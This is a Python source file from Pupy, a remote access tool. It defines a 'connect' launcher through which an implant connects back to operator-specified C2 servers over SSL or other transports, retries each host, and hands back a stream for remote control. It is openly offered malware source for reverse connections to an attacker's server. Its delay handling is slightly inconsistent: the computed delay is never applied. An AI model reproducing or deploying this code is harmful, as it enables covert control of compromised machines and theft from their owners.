# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from ..base_launcher import *
from random import uniform
import time

class ConnectLauncher(BaseLauncher):
    """ simple launcher that uses TCP connect with a chosen transport """

    credentials = [ 'SSL_BIND_CERT' ]

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload=kwargs.pop("connect_on_bind_payload", False)
        super(ConnectLauncher, self).__init__(*args, **kwargs)
    def init_argparse(self):
        self.arg_parser = LauncherArgumentParser(prog="connect", description=self.__doc__)
        self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to. Add redundant servers with additional --host entries', action='append')
        self.arg_parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
        self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")
        self.arg_parser.add_argument('--delay', metavar='<integer>', required=False, help='sleeps X number of min between connection attempts with some randomization thrown in')

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)
        self.rhost, self.rport = None, None
        self.set_transport(self.args.transport)
    def iterate(self):
        for server in self.args.host:
            count = 0
            #try a server host 3 times before moving onto the next
            while count <3:
                if self.args is None:
                    raise LauncherError("parse_args needs to be called before iterate")
                logging.info("connecting to %s:%s using transport %s ..."%(self.rhost, self.rport, self.args.transport))
                opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
                t=network.conf.transports[self.args.transport](bind_payload=self.connect_on_bind_payload)
                client_args=t.client_kwargs
                transport_args=t.client_transport_kwargs
                for val in opt_args:
                    if val.lower() in t.client_kwargs:
                        client_args[val.lower()]=opt_args[val]
                    elif val.lower() in t.client_transport_kwargs:
                        transport_args[val.lower()]=opt_args[val]
                    else:
                        logging.warning("unknown transport argument : %s"%val)
                logging.info("using client options: %s"%client_args)
                logging.info("using transports options: %s"%transport_args)
                try:
                    t.parse_args(transport_args)
                except Exception as e:
                    #at this point we quit if we can't instanciate the client
                    raise SystemExit(e)

                try:
                    client=t.client(**client_args)
                except Exception as e:
                    raise SystemExit(e)

                #logging.debug("Trying: " + str(server))

                try:
                    host= server.rsplit(":", 1)
                    self.rhost = host[0]
                    if len(host) == 2:
                        self.rport = host[1]
                    else:
                        self.rport = 443
                    self.set_host("%s:%s" % (self.rhost, self.rport))
                    s=client.connect(self.rhost, self.rport)
                    stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
                    yield stream
                except Exception as e:
                    count+=1
                    if self.args.delay > 0:
                        time.sleep(30)

            if self.args.delay > 0:
                delay = float(self.args.delay) * 60.0 * uniform(1.00, 1.05)
                #logging.debug("Delay: " + str(delay))